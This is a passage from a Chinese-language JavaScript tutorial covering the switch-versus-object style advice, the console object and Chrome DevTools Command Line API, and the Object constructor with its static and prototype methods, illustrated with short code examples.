    ``switch...case`` 结构要求，在每一个 ``case`` 的最后一行必须是 ``break`` 语句，否则会接着运行下一个 ``case`` 。这样不仅容易忘记，还会造成代码的冗长。

   而且， ``switch...case`` 不使用大括号，不利于代码形式的统一。此外，这种结构类似于 ``goto`` 语句，容易造成程序流程的混乱，使得代码结构混乱不堪，不符合面向对象编程的原则。

   .. code:: javascript

      function doAction(action) {
        switch (action) {
          case 'hack':
            return 'hack';
          case 'slash':
            return 'slash';
          case 'run':
            return 'run';
          default:
            throw new Error('Invalid action.');
        }
      }

   上面的代码建议改写成对象结构。

   .. code:: javascript

      function doAction(action) {
        var actions = {
          'hack': function () {
            return 'hack';
          },
          'slash': function () {
            return 'slash';
          },
          'run': function () {
            return 'run';
          }
        };
   
        if (typeof actions[action] !== 'function') {
          throw new Error('Invalid action.');
        }
   
        return actions[action]();
      }

   因此，建议 ``switch...case`` 结构可以用对象结构代替。

参考链接
-------

   - Eric Elliott, Programming JavaScript Applications, [Chapter 2. JavaScript Style Guide](https://www.oreilly.com/library/view/programming-javascript-applications/9781491950289/), O'Reilly, 2014
   - Axel Rauschmayer, [A meta style guide for JavaScript](http://www.2ality.com/2013/07/meta-style-guide.html)
   - Axel Rauschmayer, [Automatic semicolon insertion in JavaScript](http://www.2ality.com/2011/05/semicolon-insertion.html)
   - Rod Vagg, [JavaScript and Semicolons](http://dailyjs.com/2012/04/19/semicolons/)

/🟠 console 对象与控制台
======================

console 对象
-----------

    ``console`` 对象是 JavaScript 的原生对象，它有点像 Unix 系统的标准输出 ``stdout`` 和标准错误 ``stderr`` ，可以输出各种信息到控制台，并且还提供了很多有用的辅助方法。

    ``console`` 的常见用途有两个。

   - 调试程序，显示网页代码运行时的错误信息。
   - 提供了一个命令行接口，用来与网页代码互动。

    ``console`` 对象的浏览器实现，包含在浏览器自带的开发工具之中。以 Chrome 浏览器的“开发者工具”（Developer Tools）为例，可以使用下面三种方法的打开它。

   1. 按 F12 或者 ``Control + Shift + i`` （PC）/  ``Command + Option + i`` （Mac）。
   2. 浏览器菜单选择“工具/开发者工具”。
   3. 在一个页面元素上，打开右键菜单，选择其中的“Inspect Element”。

   打开开发者工具以后，顶端有多个面板。

   - **Elements**：查看网页的 HTML 源码和 CSS 代码。
   - **Resources**：查看网页加载的各种资源文件（比如代码文件、字体文件 CSS 文件等），以及在硬盘上创建的各种内容（比如本地缓存、Cookie、Local Storage等）。
   - **Network**：查看网页的 HTTP 通信情况。
   - **Sources**：查看网页加载的脚本源码。
   - **Timeline**：查看各种网页行为随时间变化的情况。
   - **Performance**：查看网页的性能情况，比如 CPU 和内存消耗。
   - **Console**：用来运行 JavaScript 命令。

   这些面板都有各自的用途，以下只介绍 ``Console`` 面板（又称为控制台）。

    ``Console`` 面板基本上就是一个命令行窗口，你可以在提示符下，键入各种命令。

console 对象的静态方法
--------------------

    ``console`` 对象提供的各种静态方法，用来与控制台窗口互动。

console.log()，console.info()，console.debug()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``console.log`` 方法用于在控制台输出信息。它可以接受一个或多个参数，将它们连接起来输出。

   .. code:: javascript

      console.log('Hello World')
      // Hello World
      console.log('a', 'b', 'c')
      // a b c

    ``console.log`` 方法会自动在每次输出的结尾，添加换行符。

   .. code:: javascript

      console.log(1);
      console.log(2);
      console.log(3);
      // 1
      // 2
      // 3

   如果第一个参数是格式字符串（使用了格式占位符）， ``console.log`` 方法将依次用后面的参数替换占位符，然后再进行输出。

   .. code:: javascript

      console.log(' %s + %s = %s', 1, 1, 2)
      //  1 + 1 = 2

   上面代码中， ``console.log`` 方法的第一个参数有三个占位符（ ``%s`` ），第二、三、四个参数会在显示时，依次替换掉这个三个占位符。

    ``console.log`` 方法支持以下占位符，不同类型的数据必须使用对应的占位符。

   -  ``%s``  字符串
   -  ``%d``  整数
   -  ``%i``  整数
   -  ``%f``  浮点数
   -  ``%o``  对象的链接
   -  ``%c``  CSS 格式字符串

   .. code:: javascript

      var number = 11 * 9;
      var color = 'red';
   
      console.log('%d %s balloons', number, color);
      // 99 red balloons

   上面代码中，第二个参数是数值，对应的占位符是 ``%d`` ，第三个参数是字符串，对应的占位符是 ``%s`` 。

   使用 ``%c`` 占位符时，对应的参数必须是 CSS 代码，用来对输出内容进行 CSS 渲染。

   .. code:: javascript

      console.log(
        '%cThis text is styled!',
        'color: red; background: yellow; font-size: 24px;'
      )

   上面代码运行后，输出的内容将显示为黄底红字。

    ``console.log`` 方法的两种参数格式，可以结合在一起使用。

   .. code:: javascript

      console.log(' %s + %s ', 1, 1, '= 2')
      // 1 + 1  = 2

   如果参数是一个对象， ``console.log`` 会显示该对象的值。

   .. code:: javascript

      console.log({foo: 'bar'})
      // Object {foo: "bar"}
      console.log(Date)
      // function Date() { [native code] }

   上面代码输出 ``Date`` 对象的值，结果为一个构造函数。

    ``console.info`` 是 ``console.log`` 方法的别名，用法完全一样。只不过 ``console.info`` 方法会在输出信息的前面，加上一个蓝色图标。

    ``console.debug`` 方法与 ``console.log`` 方法类似，会在控制台输出调试信息。但是，默认情况下， ``console.debug`` 输出的信息不会显示，只有在打开显示级别在 ``verbose`` 的情况下，才会显示。

    ``console`` 对象的所有方法，都可以被覆盖。因此，可以按照自己的需要，定义 ``console.log`` 方法。

   .. code:: javascript

      ['log', 'info', 'warn', 'error'].forEach(function(method) {
        console[method] = console[method].bind(
          console,
          new Date().toISOString()
        );
      });
   
      console.log("出错了！");
      // 2014-05-18T09:00.000Z 出错了！

   上面代码表示，使用自定义的 ``console.log`` 方法，可以在显示结果添加当前时间。

console.warn()，console.error()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``warn`` 方法和 ``error`` 方法也是在控制台输出信息，它们与 ``log`` 方法的不同之处在于， ``warn`` 方法输出信息时，在最前面加一个黄色三角，表示警告； ``error`` 方法输出信息时，在最前面加一个红色的叉，表示出错。同时，还会高亮显示输出文字和错误发生的堆栈。其他方面都一样。

   .. code:: javascript

      console.error('Error: %s (%i)', 'Server is not responding', 500)
      // Error: Server is not responding (500)
      console.warn('Warning! Too few nodes (%d)', document.childNodes.length)
      // Warning! Too few nodes (1)

   可以这样理解， ``log`` 方法是写入标准输出（ ``stdout`` ）， ``warn`` 方法和 ``error`` 方法是写入标准错误（ ``stderr`` ）。

console.table()
~~~~~~~~~~~~~~~~

   对于某些复合类型的数据， ``console.table`` 方法可以将其转为表格显示。

   .. code:: javascript

      var languages = [
        { name: "JavaScript", fileExtension: ".js" },
        { name: "TypeScript", fileExtension: ".ts" },
        { name: "CoffeeScript", fileExtension: ".coffee" }
      ];
   
      console.table(languages);

   上面代码的 ``language`` 变量，转为表格显示如下。

   (index)|name|fileExtension
   -------|----|-------------
   0|"JavaScript"|".js"
   1|"TypeScript"|".ts"
   2|"CoffeeScript"|".coffee"

   下面是显示表格内容的例子。

   .. code:: javascript

      var languages = {
        csharp: { name: "C#", paradigm: "object-oriented" },
        fsharp: { name: "F#", paradigm: "functional" }
      };
   
      console.table(languages);

   上面代码的 ``language`` ，转为表格显示如下。

   (index)|name|paradigm
   -------|----|--------
   csharp|"C#"|"object-oriented"
   fsharp|"F#"|"functional"

console.count()
~~~~~~~~~~~~~~~~

    ``count`` 方法用于计数，输出它被调用了多少次。

   .. code:: javascript

      function greet(user) {
        console.count();
        return 'hi ' + user;
      }
   
      greet('bob')
      //  : 1
      // "hi bob"
   
      greet('alice')
      //  : 2
      // "hi alice"
   
      greet('bob')
      //  : 3
      // "hi bob"

   上面代码每次调用 ``greet`` 函数，内部的 ``console.count`` 方法就输出执行次数。

   该方法可以接受一个字符串作为参数，作为标签，对执行次数进行分类。

   .. code:: javascript

      function greet(user) {
        console.count(user);
        return "hi " + user;
      }
   
      greet('bob')
      // bob: 1
      // "hi bob"
   
      greet('alice')
      // alice: 1
      // "hi alice"
   
      greet('bob')
      // bob: 2
      // "hi bob"

   上面代码根据参数的不同，显示 ``bob`` 执行了两次， ``alice`` 执行了一次。

console.dir()，console.dirxml()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``dir`` 方法用来对一个对象进行检查（inspect），并以易于阅读和打印的格式显示。

   .. code:: javascript

      console.log({f1: 'foo', f2: 'bar'})
      // Object {f1: "foo", f2: "bar"}
   
      console.dir({f1: 'foo', f2: 'bar'})
      // Object
      //   f1: "foo"
      //   f2: "bar"
      //   __proto__: Object

   上面代码显示 ``dir`` 方法的输出结果，比 ``log`` 方法更易读，信息也更丰富。

   该方法对于输出 DOM 对象非常有用，因为会显示 DOM 对象的所有属性。

   .. code:: javascript

      console.dir(document.body)

   Node 环境之中，还可以指定以代码高亮的形式输出。

   .. code:: javascript

      console.dir(obj, {colors: true})

    ``dirxml`` 方法主要用于以目录树的形式，显示 DOM 节点。

   .. code:: javascript

      console.dirxml(document.body)

   如果参数不是 DOM 节点，而是普通的 JavaScript 对象， ``console.dirxml`` 等同于 ``console.dir`` 。

   .. code:: javascript

      console.dirxml([1, 2, 3])
      // 等同于
      console.dir([1, 2, 3])

console.assert()
~~~~~~~~~~~~~~~~~

    ``console.assert`` 方法主要用于程序运行过程中，进行条件判断，如果不满足条件，就显示一个错误，但不会中断程序执行。这样就相当于提示用户，内部状态不正确。

   它接受两个参数，第一个参数是表达式，第二个参数是字符串。只有当第一个参数为 ``false`` ，才会提示有错误，在控制台输出第二个参数，否则不会有任何结果。

   .. code:: javascript

      console.assert(false, '判断条件不成立')
      // Assertion failed: 判断条件不成立
   
      // 相当于
      try {
        if (!false) {
          throw new Error('判断条件不成立');
        }
      } catch(e) {
        console.error(e);
      }

   下面是一个例子，判断子节点的个数是否大于等于500。

   .. code:: javascript

      console.assert(list.childNodes.length < 500, '节点个数大于等于500')

   上面代码中，如果符合条件的节点小于500个，不会有任何输出；只有大于等于500时，才会在控制台提示错误，并且显示指定文本。

console.time()，console.timeEnd()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   这两个方法用于计时，可以算出一个操作所花费的准确时间。

   .. code:: javascript

      console.time('Array initialize');
   
      var array= new Array(1000000);
      for (var i = array.length - 1; i >= 0; i--) {
        array[i] = new Object();
      };
   
      console.timeEnd('Array initialize');
      // Array initialize: 1914.481ms

    ``time`` 方法表示计时开始， ``timeEnd`` 方法表示计时结束。它们的参数是计时器的名称。调用 ``timeEnd`` 方法之后，控制台会显示“计时器名称: 所耗费的时间”。

console.group()，console.groupEnd()，console.groupCollapsed()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``console.group`` 和 ``console.groupEnd`` 这两个方法用于将显示的信息分组。它只在输出大量信息时有用，分在一组的信息，可以用鼠标折叠/展开。

   .. code:: javascript

      console.group('一级分组');
      console.log('一级分组的内容');
   
      console.group('二级分组');
      console.log('二级分组的内容');
   
      console.groupEnd(); // 二级分组结束
      console.groupEnd(); // 一级分组结束

   上面代码会将“二级分组”显示在“一级分组”内部，并且“一级分组”和“二级分组”前面都有一个折叠符号，可以用来折叠本级的内容。

    ``console.groupCollapsed`` 方法与 ``console.group`` 方法很类似，唯一的区别是该组的内容，在第一次显示时是收起的（collapsed），而不是展开的。

   .. code:: javascript

      console.groupCollapsed('Fetching Data');
   
      console.log('Request Sent');
      console.error('Error: Server not responding (500)');
   
      console.groupEnd();

   上面代码只显示一行”Fetching Data“，点击后才会展开，显示其中包含的两行。

console.trace()，console.clear()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``console.trace`` 方法显示当前执行的代码在堆栈中的调用路径。

   .. code:: javascript

      console.trace()
      // console.trace()
      //   (anonymous function)
      //   InjectedScript._evaluateOn
      //   InjectedScript._evaluateAndWrap
      //   InjectedScript.evaluate

    ``console.clear`` 方法用于清除当前控制台的所有输出，将光标回置到第一行。如果用户选中了控制台的“Preserve log”选项， ``console.clear`` 方法将不起作用。

控制台命令行 API
---------------

   浏览器控制台中，除了使用 ``console`` 对象，还可以使用一些控制台自带的命令行方法。

   （1） ``$_`` 

    ``$_`` 属性返回上一个表达式的值。

   .. code:: javascript

      2 + 2
      // 4
      $_
      // 4

   （2） ``$0``  -  ``$4`` 

   控制台保存了最近5个在 Elements 面板选中的 DOM 元素， ``$0`` 代表倒数第一个（最近一个）， ``$1`` 代表倒数第二个，以此类推直到 ``$4`` 。

   （3） ``$(selector)`` 

    ``$(selector)`` 返回第一个匹配的元素，等同于 ``document.querySelector()`` 。注意，如果页面脚本对 ``$`` 有定义，则会覆盖原始的定义。比如，页面里面有 jQuery，控制台执行 ``$(selector)`` 就会采用 jQuery 的实现，返回一个数组。

   （4） ``$$(selector)`` 

    ``$$(selector)`` 返回选中的 DOM 对象，等同于 ``document.querySelectorAll`` 。

   （5） ``$x(path)`` 

    ``$x(path)`` 方法返回一个数组，包含匹配特定 XPath 表达式的所有 DOM 元素。

   .. code:: javascript

      $x("//p[a]")

   上面代码返回所有包含 ``a`` 元素的 ``p`` 元素。

   （6） ``inspect(object)`` 

    ``inspect(object)`` 方法打开相关面板，并选中相应的元素，显示它的细节。DOM 元素在 ``Elements`` 面板中显示，比如 ``inspect(document)`` 会在 Elements 面板显示 ``document`` 元素。JavaScript 对象在控制台面板 ``Profiles`` 面板中显示，比如 ``inspect(window)`` 。

   （7） ``getEventListeners(object)`` 

    ``getEventListeners(object)`` 方法返回一个对象，该对象的成员为 ``object`` 登记了回调函数的各种事件（比如 ``click`` 或 ``keydown`` ），每个事件对应一个数组，数组的成员为该事件的回调函数。

   （8） ``keys(object)`` ， ``values(object)`` 

    ``keys(object)`` 方法返回一个数组，包含 ``object`` 的所有键名。

    ``values(object)`` 方法返回一个数组，包含 ``object`` 的所有键值。

   .. code:: javascript

      var o = {'p1': 'a', 'p2': 'b'};
   
      keys(o)
      // ["p1", "p2"]
      values(o)
      // ["a", "b"]

   （9） ``monitorEvents(object[, events]) ，unmonitorEvents(object[, events])`` 

    ``monitorEvents(object[, events])`` 方法监听特定对象上发生的特定事件。事件发生时，会返回一个 ``Event`` 对象，包含该事件的相关信息。 ``unmonitorEvents`` 方法用于停止监听。

   .. code:: javascript

      monitorEvents(window, "resize");
      monitorEvents(window, ["resize", "scroll"])

   上面代码分别表示单个事件和多个事件的监听方法。

   .. code:: javascript

      monitorEvents($0, 'mouse');
      unmonitorEvents($0, 'mousemove');

   上面代码表示如何停止监听。

    ``monitorEvents`` 允许监听同一大类的事件。所有事件可以分成四个大类。

   - mouse："mousedown", "mouseup", "click", "dblclick", "mousemove", "mouseover", "mouseout", "mousewheel"
   - key："keydown", "keyup", "keypress", "textInput"
   - touch："touchstart", "touchmove", "touchend", "touchcancel"
   - control："resize", "scroll", "zoom", "focus", "blur", "select", "change", "submit", "reset"

   .. code:: javascript

      monitorEvents($("#msg"), "key");

   上面代码表示监听所有 ``key`` 大类的事件。

   （10）其他方法

   命令行 API 还提供以下方法。

   -  ``clear()`` ：清除控制台的历史。
   -  ``copy(object)`` ：复制特定 DOM 元素到剪贴板。
   -  ``dir(object)`` ：显示特定对象的所有属性，是 ``console.dir`` 方法的别名。
   -  ``dirxml(object)`` ：显示特定对象的 XML 形式，是 ``console.dirxml`` 方法的别名。

debugger 语句
------------

    ``debugger`` 语句主要用于除错，作用是设置断点。如果有正在运行的除错工具，程序运行到 ``debugger`` 语句时会自动停下。如果没有除错工具， ``debugger`` 语句不会产生任何结果，JavaScript 引擎自动跳过这一句。

   Chrome 浏览器中，当代码运行到 ``debugger`` 语句时，就会暂停运行，自动打开脚本源码界面。

   .. code:: javascript

      for(var i = 0; i < 5; i++){
        console.log(i);
        if (i === 2) debugger;
      }

   上面代码打印出0，1，2以后，就会暂停，自动打开源码界面，等待进一步处理。

参考链接
-------

   - Chrome Developer Tools, [Using the Console](https://developers.google.com/chrome-developer-tools/docs/console)
   - Matt West, [Mastering The Developer Tools Console](http://blog.teamtreehouse.com/mastering-developer-tools-console)
   - Firebug Wiki, [Console API](https://getfirebug.com/wiki/index.php/Console_API)
   - Axel Rauschmayer, [The JavaScript console API](http://www.2ality.com/2013/10/console-api.html)
   - Marius Schulz, [Advanced JavaScript Debugging with console.table()](http://blog.mariusschulz.com/2013/11/13/advanced-javascript-debugging-with-consoletable)
   - Google Developer, [Command Line API Reference](https://developers.google.com/chrome-developer-tools/docs/commandline-api)


/🟡5. 标准库
================================================================================

/🟠 Object 对象
===============


概述
---

   JavaScript 原生提供 ``Object`` 对象（注意起首的 ``O`` 是大写），本章介绍该对象原生的各种方法。

   JavaScript 的所有其他对象都继承自 ``Object`` 对象，即那些对象都是 ``Object`` 的实例。

    ``Object`` 对象的原生方法分成两类： ``Object`` 本身的方法与 ``Object`` 的实例方法。

   **（1） ``Object`` 对象本身的方法**

   所谓“本身的方法”就是直接定义在 ``Object`` 对象的方法。

   .. code:: javascript

      Object.print = function (o) { console.log(o) };

   上面代码中， ``print`` 方法就是直接定义在 ``Object`` 对象上。

   **（2） ``Object`` 的实例方法**

   所谓实例方法就是定义在 ``Object`` 原型对象 ``Object.prototype`` 上的方法。它可以被 ``Object`` 实例直接使用。

   .. code:: javascript

      Object.prototype.print = function () {
        console.log(this);
      };
   
      var obj = new Object();
      obj.print() // Object

   上面代码中， ``Object.prototype`` 定义了一个 ``print`` 方法，然后生成一个 ``Object`` 的实例 ``obj`` 。 ``obj`` 直接继承了 ``Object.prototype`` 的属性和方法，可以直接使用 ``obj.print`` 调用 ``print`` 方法。也就是说， ``obj`` 对象的 ``print`` 方法实质上就是调用 ``Object.prototype.print`` 方法。

   关于原型对象 ``object.prototype`` 的详细解释，参见《面向对象编程》章节。这里只要知道，凡是定义在 ``Object.prototype`` 对象上面的属性和方法，将被所有实例对象共享就可以了。

   以下先介绍 ``Object`` 作为函数的用法，然后再介绍 ``Object`` 对象的原生方法，分成对象自身的方法（又称为“静态方法”）和实例方法两部分。

Object()
---------

    ``Object`` 本身是一个函数，可以当作工具方法使用，将任意值转为对象。这个方法常用于保证某个值一定是对象。

   如果参数为空（或者为 ``undefined`` 和 ``null`` ）， ``Object()`` 返回一个空对象。

   .. code:: javascript

      var obj = Object();
      // 等同于
      var obj = Object(undefined);
      var obj = Object(null);
   
      obj instanceof Object // true

   上面代码的含义，是将 ``undefined`` 和 ``null`` 转为对象，结果得到了一个空对象 ``obj`` 。

    ``instanceof`` 运算符用来验证，一个对象是否为指定的构造函数的实例。 ``obj instanceof Object`` 返回 ``true`` ，就表示 ``obj`` 对象是 ``Object`` 的实例。

   如果参数是原始类型的值， ``Object`` 方法将其转为对应的包装对象的实例（参见《原始类型的包装对象》一章）。

   .. code:: javascript

      var obj = Object(1);
      obj instanceof Object // true
      obj instanceof Number // true
   
      var obj = Object('foo');
      obj instanceof Object // true
      obj instanceof String // true
   
      var obj = Object(true);
      obj instanceof Object // true
      obj instanceof Boolean // true

   上面代码中， ``Object`` 函数的参数是各种原始类型的值，转换成对象就是原始类型值对应的包装对象。

   如果 ``Object`` 方法的参数是一个对象，它总是返回该对象，即不用转换。

   .. code:: javascript

      var arr = [];
      var obj = Object(arr); // 返回原数组
      obj === arr // true
   
      var value = {};
      var obj = Object(value) // 返回原对象
      obj === value // true
   
      var fn = function () {};
      var obj = Object(fn); // 返回原函数
      obj === fn // true

   利用这一点，可以写一个判断变量是否为对象的函数。

   .. code:: javascript

      function isObject(value) {
        return value === Object(value);
      }
   
      isObject([]) // true
      isObject(true) // false

Object 构造函数
--------------

    ``Object`` 不仅可以当作工具函数使用，还可以当作构造函数使用，即前面可以使用 ``new`` 命令。

    ``Object`` 构造函数的首要用途，是直接通过它来生成新对象。

   .. code:: javascript

      var obj = new Object();

   > 注意，通过 ``var obj = new Object()`` 的写法生成新对象，与字面量的写法 ``var obj = {}`` 是等价的。或者说，后者只是前者的一种简便写法。

    ``Object`` 构造函数的用法与工具方法很相似，几乎一模一样。使用时，可以接受一个参数，如果该参数是一个对象，则直接返回这个对象；如果是一个原始类型的值，则返回该值对应的包装对象（详见《包装对象》一章）。

   .. code:: javascript

      var o1 = {a: 1};
      var o2 = new Object(o1);
      o1 === o2 // true
   
      var obj = new Object(123);
      obj instanceof Number // true

   虽然用法相似，但是 ``Object(value)`` 与 ``new Object(value)`` 两者的语义是不同的， ``Object(value)`` 表示将 ``value`` 转成一个对象， ``new Object(value)`` 则表示新生成一个对象，它的值是 ``value`` 。

Object 的静态方法
---------------

   所谓“静态方法”，是指部署在 ``Object`` 对象自身的方法。

Object.keys()，Object.getOwnPropertyNames()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Object.keys`` 方法和 ``Object.getOwnPropertyNames`` 方法都用来遍历对象的属性。

    ``Object.keys`` 方法的参数是一个对象，返回一个数组。该数组的成员都是该对象自身的（而不是继承的）所有属性名。

   .. code:: javascript

      var obj = {
        p1: 123,
        p2: 456
      };
   
      Object.keys(obj) // ["p1", "p2"]

    ``Object.getOwnPropertyNames`` 方法与 ``Object.keys`` 类似，也是接受一个对象作为参数，返回一个数组，包含了该对象自身的所有属性名。

   .. code:: javascript

      var obj = {
        p1: 123,
        p2: 456
      };
   
      Object.getOwnPropertyNames(obj) // ["p1", "p2"]

   对于一般的对象来说， ``Object.keys()`` 和 ``Object.getOwnPropertyNames()`` 返回的结果是一样的。只有涉及不可枚举属性时，才会有不一样的结果。 ``Object.keys`` 方法只返回可枚举的属性（详见《对象属性的描述对象》一章）， ``Object.getOwnPropertyNames`` 方法还返回不可枚举的属性名。

   .. code:: javascript

      var a = ['Hello', 'World'];
   
      Object.keys(a) // ["0", "1"]
      Object.getOwnPropertyNames(a) // ["0", "1", "length"]

   上面代码中，数组的 ``length`` 属性是不可枚举的属性，所以只出现在 ``Object.getOwnPropertyNames`` 方法的返回结果中。

   由于 JavaScript 没有提供计算对象属性个数的方法，所以可以用这两个方法代替。

   .. code:: javascript

      var obj = {
        p1: 123,
        p2: 456
      };
   
      Object.keys(obj).length // 2
      Object.getOwnPropertyNames(obj).length // 2

   一般情况下，几乎总是使用 ``Object.keys`` 方法，遍历对象的属性。

其他方法
~~~~~~~

   除了上面提到的两个方法， ``Object`` 还有不少其他静态方法，将在后文逐一详细介绍。

   **（1）对象属性模型的相关方法**

   -  ``Object.getOwnPropertyDescriptor()`` ：获取某个属性的描述对象。
   -  ``Object.defineProperty()`` ：通过描述对象，定义某个属性。
   -  ``Object.defineProperties()`` ：通过描述对象，定义多个属性。

   **（2）控制对象状态的方法**

   -  ``Object.preventExtensions()`` ：防止对象扩展。
   -  ``Object.isExtensible()`` ：判断对象是否可扩展。
   -  ``Object.seal()`` ：禁止对象配置。
   -  ``Object.isSealed()`` ：判断一个对象是否可配置。
   -  ``Object.freeze()`` ：冻结一个对象。
   -  ``Object.isFrozen()`` ：判断一个对象是否被冻结。

   **（3）原型链相关方法**

   -  ``Object.create()`` ：该方法可以指定原型对象和属性，返回一个新的对象。
   -  ``Object.getPrototypeOf()`` ：获取对象的 ``Prototype`` 对象。

Object 的实例方法
---------------

   除了静态方法，还有不少方法定义在 ``Object.prototype`` 对象。它们称为实例方法，所有 ``Object`` 的实例对象都继承了这些方法。

    ``Object`` 实例对象的方法，主要有以下六个。

   -  ``Object.prototype.valueOf()`` ：返回当前对象对应的值。
   -  ``Object.prototype.toString()`` ：返回当前对象对应的字符串形式。
   -  ``Object.prototype.toLocaleString()`` ：返回当前对象对应的本地字符串形式。
   -  ``Object.prototype.hasOwnProperty()`` ：判断某个属性是否为当前对象自身的属性，还是继承自原型对象的属性。
   -  ``Object.prototype.isPrototypeOf()`` ：判断当前对象是否为另一个对象的原型。
   -  ``Object.prototype.propertyIsEnumerable()`` ：判断某个属性是否可枚举。

   本节介绍前四个方法，另外两个方法将在后文相关章节介绍。

Object.prototype.valueOf()
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``valueOf`` 方法的作用是返回一个对象的“值”，默认情况下返回对象本身。

   .. code:: javascript

      var obj = new Object();
      obj.valueOf() === obj // true

   上面代码比较 ``obj.valueOf()`` 与 ``obj`` 本身，两者是一样的。

    ``valueOf`` 方法的主要用途是，JavaScript 自动类型转换时会默认调用这个方法（详见《数据类型转换》一章）。

   .. code:: javascript

      var obj = new Object();
      1 + obj // "1[object Object]"

   上面代码将对象 ``obj`` 与数字 ``1`` 相加，这时 JavaScript 就会默认调用 ``valueOf()`` 方法，求出 ``obj`` 的值再与 ``1`` 相加。所以，如果自定义 ``valueOf`` 方法，就可以得到想要的结果。

   .. code:: javascript

      var obj = new Object();
      obj.valueOf = function () {
        return 2;
      };
   
      1 + obj // 3

   上面代码自定义了 ``obj`` 对象的 ``valueOf`` 方法，于是 ``1 + obj`` 就得到了 ``3`` 。这种方法就相当于用自定义的 ``obj.valueOf`` ，覆盖 ``Object.prototype.valueOf`` 。

Object.prototype.toString()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``toString`` 方法的作用是返回一个对象的字符串形式，默认情况下返回类型字符串。

   .. code:: javascript

      var o1 = new Object();
      o1.toString() // "[object Object]"
   
      var o2 = {a:1};
      o2.toString() // "[object Object]"

   上面代码表示，对于一个对象调用 ``toString`` 方法，会返回字符串 ``[object Object]`` ，该字符串说明对象的类型。

   字符串 ``[object Object]`` 本身没有太大的用处，但是通过自定义 ``toString`` 方法，可以让对象在自动类型转换时，得到想要的字符串形式。

   .. code:: javascript

      var obj = new Object();
   
      obj.toString = function () {
        return 'hello';
      };
   
      obj + ' ' + 'world' // "hello world"

   上面代码表示，当对象用于字符串加法时，会自动调用 ``toString`` 方法。由于自定义了 ``toString`` 方法，所以返回字符串 ``hello world`` 。

   数组、字符串、函数、Date 对象都分别部署了自定义的 ``toString`` 方法，覆盖了 ``Object.prototype.toString`` 方法。

   .. code:: javascript

      [1, 2, 3].toString() // "1,2,3"
   
      '123'.toString() // "123"
   
      (function () {
        return 123;
      }).toString()
      // "function () {
      //   return 123;
      // }"
   
      (new Date()).toString()
      // "Tue May 10 2016 09:11:31 GMT+0800 (CST)"

   上面代码中，数组、字符串、函数、Date 对象调用 ``toString`` 方法，并不会返回 ``[object Object]`` ，因为它们都自定义了 ``toString`` 方法，覆盖原始方法。

toString() 的应用：判断数据类型
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Object.prototype.toString`` 方法返回对象的类型字符串，因此可以用来判断一个值的类型。

   .. code:: javascript

      var obj = {};
      obj.toString() // "[object Object]"

   上面代码调用空对象的 ``toString`` 方法，结果返回一个字符串 ``[object Object]`` ，其中第二个 ``Object`` 表示该值的构造函数。这是一个十分有用的判断数据类型的方法。

   由于实例对象可能会自定义 ``toString`` 方法，覆盖掉 ``Object.prototype.toString`` 方法，所以为了得到类型字符串，最好直接使用 ``Object.prototype.toString`` 方法。通过函数的 ``call`` 方法，可以在任意值上调用这个方法，帮助我们判断这个值的类型。

   .. code:: javascript

      Object.prototype.toString.call(value)

   上面代码表示对 ``value`` 这个值调用 ``Object.prototype.toString`` 方法。

   不同数据类型的 ``Object.prototype.toString`` 方法返回值如下。

   - 数值：返回 ``[object Number]`` 。
   - 字符串：返回 ``[object String]`` 。
   - 布尔值：返回 ``[object Boolean]`` 。
   - undefined：返回 ``[object Undefined]`` 。
   - null：返回 ``[object Null]`` 。
   - 数组：返回 ``[object Array]`` 。
   - arguments 对象：返回 ``[object Arguments]`` 。
   - 函数：返回 ``[object Function]`` 。
   - Error 对象：返回 ``[object Error]`` 。
   - Date 对象：返回 ``[object Date]`` 。
   - RegExp 对象：返回 ``[object RegExp]`` 。
   - 其他对象：返回 ``[object Object]`` 。

   这就是说， ``Object.prototype.toString`` 可以看出一个值到底是什么类型。

   .. code:: javascript

      Object.prototype.toString.call(2) // "[object Number]"
      Object.prototype.toString.call('') // "[object String]"
      Object.prototype.toString.call(true) // "[object Boolean]"
      Object.prototype.toString.call(undefined) // "[object Undefined]"
      Object.prototype.toString.call(null) // "[object Null]"
      Object.prototype.toString.call(Math) // "[object Math]"
      Object.prototype.toString.call({}) // "[object Object]"
      Object.prototype.toString.call([]) // "[object Array]"

   利用这个特性，可以写出一个比 ``typeof`` 运算符更准确的类型判断函数。

   .. code:: javascript

      var type = function (o){
        var s = Object.prototype.toString.call(o);
        return s.match(/\[object (.*?)\]/)[1].toLowerCase();
      };
   
      type({}); // "object"
      type([]); // "array"
      type(5); // "number"
      type(null); // "null"
      type(); // "undefined"
      type(/abcd/); // "regex"
      type(new Date()); // "date"

   在上面这个 ``type`` 函数的基础上，还可以加上专门判断某种类型数据的方法。

   .. code:: javascript

      var type = function (o){
        var s = Object.prototype.toString.call(o);
        return s.match(/\[object (.*?)\]/)[1].toLowerCase();
      };
   
      ['Null',
       'Undefined',
       'Object',
       'Array',
       'String',
       'Number',
       'Boolean',
       'Function',
       'RegExp'
      ].forEach(function (t) {
        type['is' + t] = function (o) {
          return type(o) === t.toLowerCase();
        };
      });
   
      type.isObject({}) // true
      type.isNumber(NaN) // true
      type.isRegExp(/abc/) // true

Object.prototype.toLocaleString()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Object.prototype.toLocaleString`` 方法与 ``toString`` 的返回结果相同，也是返回一个值的字符串形式。

   .. code:: javascript

      var obj = {};
      obj.toString(obj) // "[object Object]"
      obj.toLocaleString(obj) // "[object Object]"

   这个方法的主要作用是留出一个接口，让各种不同的对象实现自己版本的 ``toLocaleString`` ，用来返回针对某些地域的特定的值。

   .. code:: javascript

      var person = {
        toString: function () {
          return 'Henry Norman Bethune';
        },
        toLocaleString: function () {
          return '白求恩';
        }
      };
   
      person.toString() // Henry Norman Bethune
      person.toLocaleString() // 白求恩

   上面代码中， ``toString()`` 方法返回对象的一般字符串形式， ``toLocaleString()`` 方法返回本地的字符串形式。

